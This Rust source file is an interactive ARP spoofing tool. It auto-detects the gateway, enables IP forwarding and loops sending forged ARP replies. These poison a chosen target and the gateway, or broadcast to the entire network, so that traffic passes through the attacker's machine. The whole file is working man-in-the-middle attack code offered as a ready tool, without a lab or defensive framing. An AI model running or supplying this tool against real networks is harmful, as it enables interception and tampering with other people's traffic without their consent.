use dialoguer::{theme::ColorfulTheme, Input, Select};
use pnet::datalink::{self, NetworkInterface};
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::net::{IpAddr, Ipv4Addr};

#[derive(Debug, Clone)]
pub struct ArpConfig {
    pub interface: Option<NetworkInterface>,
    pub gateway: Option<Ipv4Addr>,
    pub target: Option<Ipv4Addr>, // None means entire network
}

impl Default for ArpConfig {
    fn default() -> Self {
        Self {
            interface: None,
            gateway: None,
            target: None,
        }
    }
}

pub fn run() {
    let mut config = ArpConfig::default();
    let selections = &["List network settings", "Set network settings", "Start", "Back"];

    loop {
        let selection = Select::with_theme(&ColorfulTheme::default())
            .with_prompt("ARP Menu")
            .default(0)
            .items(&selections[..])
            .interact()
            .unwrap();

        match selections[selection] {
            "List network settings" => list_network_settings(),
            "Set network settings" => set_network_settings(&mut config),
            "Start" => start_arp(&config),
            "Back" => break,
            _ => unreachable!(),
        }
    }
}

fn list_network_settings() {
    let interfaces = datalink::interfaces();
    
    if interfaces.is_empty() {
        println!("No network interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select a network interface to view details")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = &interfaces[selection];

    println!("\n--- Interface Details: {} ---", selected_interface.name);
    if let Some(mac) = selected_interface.mac {
        println!("MAC Address: {}", mac);
    } else {
        println!("MAC Address: N/A");
    }
    
    println!("Index: {}", selected_interface.index);
    
    // Decode Flags
    let flags = selected_interface.flags;
    let mut flag_strs = Vec::new();
    if (flags & 1) != 0 { flag_strs.push("UP"); }
    if (flags & 2) != 0 { flag_strs.push("BROADCAST"); }
    if (flags & 8) != 0 { flag_strs.push("LOOPBACK"); }
    if (flags & 16) != 0 { flag_strs.push("POINTOPOINT"); }
    if (flags & 64) != 0 { flag_strs.push("RUNNING"); }
    if (flags & 256) != 0 { flag_strs.push("PROMISC"); }
    if (flags & 512) != 0 { flag_strs.push("ALLMULTI"); }
    if (flags & 4096) != 0 { flag_strs.push("MULTICAST"); }
    
    println!("Flags: {} ({:b})", flag_strs.join(", "), flags);

    // MTU
    if let Ok(mtu_str) = std::fs::read_to_string(format!("/sys/class/net/{}/mtu", selected_interface.name)) {
        println!("MTU: {}", mtu_str.trim());
    }

    if selected_interface.ips.is_empty() {
        println!("No IP addresses assigned.");
    } else {
        println!("IP Addresses:");
        for ip in &selected_interface.ips {
            println!(" - IP: {}", ip.ip());
            println!("   Mask: {}", ip.mask());
            
            if let IpAddr::V4(ipv4) = ip.ip() {
                if let IpAddr::V4(mask) = ip.mask() {
                    let broadcast = calculate_broadcast(ipv4, mask);
                    println!("   Broadcast: {}", broadcast);
                    let network = calculate_network(ipv4, mask);
                    println!("   Network: {}", network);
                }
            }
        }
    }

    // Try to find gateway for this interface
    if let Some(gateway) = get_default_gateway(&selected_interface.name) {
        println!("Default Gateway: {}", gateway);
    } else {
        println!("Default Gateway: Not found (or not IPv4)");
    }

    // DNS Servers
    let dns_servers = get_dns_servers();
    if !dns_servers.is_empty() {
        println!("DNS Servers: {:?}", dns_servers);
    } else {
        println!("DNS Servers: Not found");
    }

    println!("---------------------------------\n");
}

fn set_network_settings(config: &mut ArpConfig) {
    let options = &["Manual Configuration", "Auto-configure (Entire Network)", "Back"];
    
    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Set Network Settings")
        .default(0)
        .items(&options[..])
        .interact()
        .unwrap();

    match options[selection] {
        "Manual Configuration" => manual_configuration(config),
        "Auto-configure (Entire Network)" => auto_configure(config),
        "Back" => return,
        _ => unreachable!(),
    }
}

fn manual_configuration(config: &mut ArpConfig) {
    let interfaces = datalink::interfaces();
    if interfaces.is_empty() {
        println!("No interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Interface")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = interfaces[selection].clone();
    config.interface = Some(selected_interface.clone());

    // Display Interface Info
    println!("\nSelected Interface: {}", selected_interface.name);
    for ip in &selected_interface.ips {
        if let IpAddr::V4(ipv4) = ip.ip() {
             if let IpAddr::V4(mask) = ip.mask() {
                let network = calculate_network(ipv4, mask);
                println!("IP: {}, Mask: {}, Network: {}", ipv4, mask, network);
             }
        }
    }
    println!("");

    let gateway_input: String = Input::with_theme(&ColorfulTheme::default())
        .with_prompt("Default Gateway (IPv4)")
        .interact_text()
        .unwrap();
    
    if let Ok(gw) = gateway_input.parse::<Ipv4Addr>() {
        config.gateway = Some(gw);
    } else {
        println!("Invalid IP address.");
        return;
    }

    let target_input: String = Input::with_theme(&ColorfulTheme::default())
        .with_prompt("Target IP (Optional, leave empty for entire network)")
        .allow_empty(true)
        .interact_text()
        .unwrap();

    if target_input.trim().is_empty() {
        config.target = None;
    } else if let Ok(target) = target_input.parse::<Ipv4Addr>() {
        config.target = Some(target);
    } else {
        println!("Invalid IP address.");
        return;
    }

    println!("Configuration updated manually.");
}

fn auto_configure(config: &mut ArpConfig) {
    let interfaces = datalink::interfaces();
    if interfaces.is_empty() {
        println!("No interfaces found.");
        return;
    }

    let interface_names: Vec<String> = interfaces
        .iter()
        .map(|iface| format!("{} ({})", iface.name, iface.mac.unwrap_or_default()))
        .collect();

    let selection = Select::with_theme(&ColorfulTheme::default())
        .with_prompt("Select Interface for Auto-Configuration")
        .default(0)
        .items(&interface_names)
        .interact()
        .unwrap();

    let selected_interface = interfaces[selection].clone();
    config.interface = Some(selected_interface.clone());

    // Display Interface Info
    println!("\nSelected Interface: {}", selected_interface.name);
    for ip in &selected_interface.ips {
        if let IpAddr::V4(ipv4) = ip.ip() {
             if let IpAddr::V4(mask) = ip.mask() {
                let network = calculate_network(ipv4, mask);
                println!("IP: {}, Mask: {}, Network: {}", ipv4, mask, network);
             }
        }
    }

    // Auto-detect gateway
    if let Some(gw) = get_default_gateway(&selected_interface.name) {
        config.gateway = Some(gw);
        println!("Detected Gateway: {}", gw);
    } else {
        println!("Could not detect gateway. Please configure manually.");
        config.gateway = None;
    }

    // Set target to None (Entire Network)
    config.target = None;
    println!("Target set to Entire Network.");
    println!("Configuration updated automatically.");
}

use pnet::packet::arp::{ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;
use std::thread;
use std::time::Duration;
use std::sync::atomic::AtomicBool;
use std::sync::Arc;

fn start_arp(config: &ArpConfig) {
    if config.interface.is_none() || config.gateway.is_none() {
        println!("Error: Interface and Gateway must be set.");
        return;
    }

    let interface = config.interface.as_ref().unwrap();
    let gateway_ip = config.gateway.unwrap();
    
    // Enable IP forwarding
    if let Err(e) = enable_ip_forwarding() {
        println!("Warning: Could not enable IP forwarding: {}", e);
        println!("Traffic might be blocked at this machine.");
    } else {
        println!("IP Forwarding enabled.");
    }

    println!("Resolving Gateway MAC for {}...", gateway_ip);
    let gateway_mac = match resolve_mac(interface, gateway_ip) {
        Some(mac) => mac,
        None => {
            println!("Error: Could not resolve Gateway MAC. Is the gateway reachable?");
            return;
        }
    };
    println!("Gateway MAC: {}", gateway_mac);

    let _running = Arc::new(AtomicBool::new(true));
    // let r = running.clone();

    // Handle Ctrl+C to stop cleanly (optional, but good practice)
    // For now, we just loop until user kills or we implement a better stop mechanism.
    // Since we are in a menu loop, we might want to run this in a separate thread or just block until interrupt.
    // For this simple tool, blocking is fine, user can Ctrl+C.
    
    println!("Starting ARP Spoofing... Press Ctrl+C to stop.");

    if let Some(target_ip) = config.target {
        println!("Target: {}", target_ip);
        println!("Resolving Target MAC...");
        let target_mac = match resolve_mac(interface, target_ip) {
            Some(mac) => mac,
            None => {
                println!("Error: Could not resolve Target MAC. Is the target reachable?");
                return;
            }
        };
        println!("Target MAC: {}", target_mac);
        
        // Spoofing Loop
        loop {
            // Tell Target that Gateway is Me
            send_arp_packet(interface, target_mac, target_ip, interface.mac.unwrap(), gateway_ip, ArpOperations::Reply);
            
            // Tell Gateway that Target is Me
            send_arp_packet(interface, gateway_mac, gateway_ip, interface.mac.unwrap(), target_ip, ArpOperations::Reply);
            
            print!(".");
            use std::io::Write;
            std::io::stdout().flush().unwrap();
            thread::sleep(Duration::from_secs(2));
        }

    } else {
        println!("Target: Entire Network (Broadcast)");
        // Broadcast Gratuitous ARP: Tell everyone that Gateway is Me
        let broadcast_mac = MacAddr::broadcast();
        
        loop {
            // We send to broadcast MAC, but logically we are telling "Everyone" (Target IP often ignored or set to broadcast in some contexts, 
            // but for gratuitous ARP reply, we usually set Sender IP = Gateway IP, Sender MAC = My MAC.
            // Target MAC = Broadcast (or 00:00...), Target IP = Gateway IP (or sometimes broadcast).
            // A common way is:
            // Eth Dst: FF:FF:FF:FF:FF:FF
            // ARP Op: Reply
            // Sender MAC: My MAC
            // Sender IP: Gateway IP
            // Target MAC: FF:FF:FF:FF:FF:FF
            // Target IP: Gateway IP (or 255.255.255.255)
            
            send_arp_packet(interface, broadcast_mac, Ipv4Addr::new(255, 255, 255, 255), interface.mac.unwrap(), gateway_ip, ArpOperations::Reply);
            
            print!(".");
            use std::io::Write;
            std::io::stdout().flush().unwrap();
            thread::sleep(Duration::from_secs(2));
        }
    }
}

fn enable_ip_forwarding() -> std::io::Result<()> {
    use std::io::Write;
    let mut file = File::create("/proc/sys/net/ipv4/ip_forward")?;
    file.write_all(b"1")?;
    Ok(())
}

fn resolve_mac(interface: &NetworkInterface, target_ip: Ipv4Addr) -> Option<MacAddr> {
    let source_ip = interface.ips.iter().find(|ip| ip.is_ipv4())?.ip();
    let source_ipv4 = if let IpAddr::V4(ip) = source_ip { ip } else { return None };
    let source_mac = interface.mac?;

    let (_tx, mut rx) = match pnet::datalink::channel(interface, Default::default()) {
        Ok(pnet::datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => return None,
        Err(e) => {
            println!("Error creating channel: {}", e);
            return None;
        }
    };

    // Send ARP Request
    // Eth Dst: Broadcast
    // ARP Op: Request
    // Sender MAC: My MAC
    // Sender IP: My IP
    // Target MAC: 00:00:00:00:00:00
    // Target IP: Target IP
    
    send_arp_packet(interface, MacAddr::broadcast(), target_ip, source_mac, source_ipv4, ArpOperations::Request);

    // Wait for Reply
    let start = std::time::Instant::now();
    loop {
        if start.elapsed() > Duration::from_secs(2) {
            return None;
        }

        match rx.next() {
            Ok(packet) => {
                let ethernet = EthernetPacket::new(packet).unwrap();
                if ethernet.get_ethertype() == EtherTypes::Arp {
                    let arp = ArpPacket::new(ethernet.payload()).unwrap();
                    if arp.get_operation() == ArpOperations::Reply && 
                       arp.get_sender_proto_addr() == target_ip && 
                       arp.get_target_hw_addr() == source_mac {
                        return Some(arp.get_sender_hw_addr());
                    }
                }
            },
            Err(_) => continue,
        }
    }
}

fn send_arp_packet(
    interface: &NetworkInterface, 
    target_mac: MacAddr, 
    target_ip: Ipv4Addr, 
    sender_mac: MacAddr, 
    sender_ip: Ipv4Addr,
    operation: pnet::packet::arp::ArpOperation
) {
    let (mut tx, _) = match pnet::datalink::channel(interface, Default::default()) {
        Ok(pnet::datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        _ => return,
    };

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(sender_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(operation);
    arp_packet.set_sender_hw_addr(sender_mac);
    arp_packet.set_sender_proto_addr(sender_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet_mut());

    tx.send_to(ethernet_packet.packet(), None);
}

// Helpers

fn calculate_broadcast(ip: Ipv4Addr, mask: Ipv4Addr) -> Ipv4Addr {
    let ip_u32 = u32::from(ip);
    let mask_u32 = u32::from(mask);
    let broadcast_u32 = ip_u32 | !mask_u32;
    Ipv4Addr::from(broadcast_u32)
}

fn calculate_network(ip: Ipv4Addr, mask: Ipv4Addr) -> Ipv4Addr {
    let ip_u32 = u32::from(ip);
    let mask_u32 = u32::from(mask);
    let network_u32 = ip_u32 & mask_u32;
    Ipv4Addr::from(network_u32)
}

fn get_default_gateway(interface_name: &str) -> Option<Ipv4Addr> {
    let file = File::open("/proc/net/route").ok()?;
    let reader = BufReader::new(file);

    for line in reader.lines() {
        if let Ok(l) = line {
            let parts: Vec<&str> = l.split_whitespace().collect();
            if parts.len() > 2 && parts[0] == interface_name && parts[1] == "00000000" {
                // Gateway is in parts[2], hex string, little endian
                if let Ok(gw_val) = u32::from_str_radix(parts[2], 16) {
                    // Convert from little endian u32 to Ipv4Addr
                    let b1 = (gw_val & 0xFF) as u8;
                    let b2 = ((gw_val >> 8) & 0xFF) as u8;
                    let b3 = ((gw_val >> 16) & 0xFF) as u8;
                    let b4 = ((gw_val >> 24) & 0xFF) as u8;
                    return Some(Ipv4Addr::new(b1, b2, b3, b4));
                }
            }
        }
    }
    None
}

fn get_dns_servers() -> Vec<IpAddr> {
    let mut servers = Vec::new();
    if let Ok(file) = File::open("/etc/resolv.conf") {
        let reader = BufReader::new(file);
        for line in reader.lines() {
            if let Ok(l) = line {
                if l.starts_with("nameserver") {
                    let parts: Vec<&str> = l.split_whitespace().collect();
                    if parts.len() > 1 {
                        if let Ok(ip) = parts[1].parse::<IpAddr>() {
                            servers.push(ip);
                        }
                    }
                }
            }
        }
    }
    servers
}
